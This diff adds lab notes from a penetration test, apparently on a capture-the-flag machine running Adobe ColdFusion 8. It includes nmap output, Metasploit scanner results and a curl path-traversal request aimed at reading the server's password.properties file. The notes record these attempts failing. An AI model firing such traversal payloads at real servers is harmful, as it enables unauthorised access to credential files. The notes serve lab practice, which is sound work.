@@ -1,0 +1,37 @@
+nmap -Pn -sS -sC -T4 -A 10.129.132.220 -v :
+PORT      STATE SERVICE VERSION
+135/tcp   open  msrpc   Microsoft Windows RPC
+8500/tcp  open  http    JRun Web Server
+49154/tcp open  msrpc   Microsoft Windows RPC
+
+Likely a windows 2008 server
+
+10.129.132.220:8500 in the browser reveals a directory. After navigating a bit I discovered the usage of CF Adobe coldfusion 8.
+Some research tells me that /CFIDE/Administrator is a common path, and when tested the login page was revealed. 
+  Admin credential is already auto-populated. Going to try default credentials.
+
+
+Found a metasploit module to scan coldfusion:
+msf6 auxiliary(scanner/http/coldfusion_locale_traversal) > run
+
+[*] 10.129.132.220 Adobe ColdFusion 8 (JRun Web Server)
+[-] 10.129.132.220 Fingerprint failed, FILE not set...aborting
+[*] URL: 10.129.132.220/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../%00en
+[*] URL: 10.129.132.220/CFIDE/wizards/common/_logintowizard.cfm?locale=../../../../../../../../../../%00en
+[*] URL: 10.129.132.220/CFIDE/administrator/archives/index.cfm?locale=../../../../../../../../../../%00en
+[*] URL: 10.129.132.220/CFIDE/administrator/entman/index.cfm?locale=../../../../../../../../../../%00en
+[*] URL: 10.129.132.220/CFIDE/administrator/logging/settings.cfm?locale=../../../../../../../../../../%00en
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+ran curl -i http://10.129.132.220:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../../lib/password.properties%00en
+and a few others but they just redirected me to the login page html.
+
+msf6 auxiliary(gather/coldfusion_pwd_props) > run
+[*] Running module against 10.129.132.220
+
+[*] 10.129.132.220:8500 Adobe ColdFusion 8 (Not Vulnerable) (JRun Web Server)
+[*] 10.129.132.220:8500 isn't vulnerable to this attack
+[*] Auxiliary module execution completed
+
+This metasploit module didn't work either. Trying to enumerate further.
